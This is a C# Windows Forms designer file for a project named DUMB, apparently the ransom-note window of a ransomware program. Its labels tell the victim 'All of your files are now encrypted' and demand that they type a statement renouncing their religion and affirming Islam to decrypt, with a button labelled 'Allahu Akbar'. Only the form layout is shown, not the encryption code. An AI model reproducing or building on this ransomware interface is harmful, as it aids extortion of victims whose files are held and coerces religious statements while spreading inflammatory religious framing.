namespace DUMB
{
    partial class Main
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.label1 = new System.Windows.Forms.Label();
            this.label2 = new System.Windows.Forms.Label();
            this.txtWhatever = new System.Windows.Forms.TextBox();
            this.btnALLAHUAKBAR = new System.Windows.Forms.Button();
            this.labelPhrase = new System.Windows.Forms.Label();
            this.labelTime = new System.Windows.Forms.Label();
            this.SuspendLayout();
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Font = new System.Drawing.Font("Tahoma", 11.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label1.Location = new System.Drawing.Point(12, 9);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(236, 18);
            this.label1.TabIndex = 0;
            this.label1.Text = "You\'ve been struck with DUMB";
            // 
            // label2
            // 
            this.label2.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.label2.Font = new System.Drawing.Font("Tahoma", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label2.Location = new System.Drawing.Point(12, 27);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(433, 67);
            this.label2.TabIndex = 1;
            this.label2.Text = "All of your files are now encrypted because you thought it would be a good idea t" +
    "o run random programs from the internet";
            // 
            // txtWhatever
            // 
            this.txtWhatever.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.txtWhatever.Location = new System.Drawing.Point(15, 136);
            this.txtWhatever.Name = "txtWhatever";
            this.txtWhatever.Size = new System.Drawing.Size(349, 20);
            this.txtWhatever.TabIndex = 2;
            // 
            // btnALLAHUAKBAR
            // 
            this.btnALLAHUAKBAR.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.btnALLAHUAKBAR.Location = new System.Drawing.Point(370, 134);
            this.btnALLAHUAKBAR.Name = "btnALLAHUAKBAR";
            this.btnALLAHUAKBAR.Size = new System.Drawing.Size(75, 23);
            this.btnALLAHUAKBAR.TabIndex = 3;
            this.btnALLAHUAKBAR.Text = "Allahu Akbar";
            this.btnALLAHUAKBAR.UseVisualStyleBackColor = true;
            this.btnALLAHUAKBAR.Click += new System.EventHandler(this.btnALLAHUAKBAR_Click);
            // 
            // labelPhrase
            // 
            this.labelPhrase.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.labelPhrase.AutoSize = true;
            this.labelPhrase.Font = new System.Drawing.Font("Tahoma", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.labelPhrase.Location = new System.Drawing.Point(12, 107);
            this.labelPhrase.Name = "labelPhrase";
            this.labelPhrase.Size = new System.Drawing.Size(349, 26);
            this.labelPhrase.TabIndex = 4;
            this.labelPhrase.Text = "To decrypt your files please enter the following into the textbox below:\r\n\'I deno" +
    "unce my religion and agree Islam is the one and true religion\'";
            // 
            // labelTime
            // 
            this.labelTime.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.labelTime.AutoSize = true;
            this.labelTime.Font = new System.Drawing.Font("Tahoma", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.labelTime.ForeColor = System.Drawing.SystemColors.GrayText;
            this.labelTime.Location = new System.Drawing.Point(12, 94);
            this.labelTime.Name = "labelTime";
            this.labelTime.Size = new System.Drawing.Size(96, 13);
            this.labelTime.TabIndex = 5;
            this.labelTime.Text = "Processing took 0s";
            // 
            // Main
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(453, 165);
            this.ControlBox = false;
            this.Controls.Add(this.labelTime);
            this.Controls.Add(this.labelPhrase);
            this.Controls.Add(this.btnALLAHUAKBAR);
            this.Controls.Add(this.txtWhatever);
            this.Controls.Add(this.label2);
            this.Controls.Add(this.label1);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
            this.Name = "Main";
            this.ShowIcon = false;
            this.Text = "Main";
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.Label label2;
        private System.Windows.Forms.TextBox txtWhatever;
        private System.Windows.Forms.Button btnALLAHUAKBAR;
        private System.Windows.Forms.Label labelPhrase;
        private System.Windows.Forms.Label labelTime;
    }
}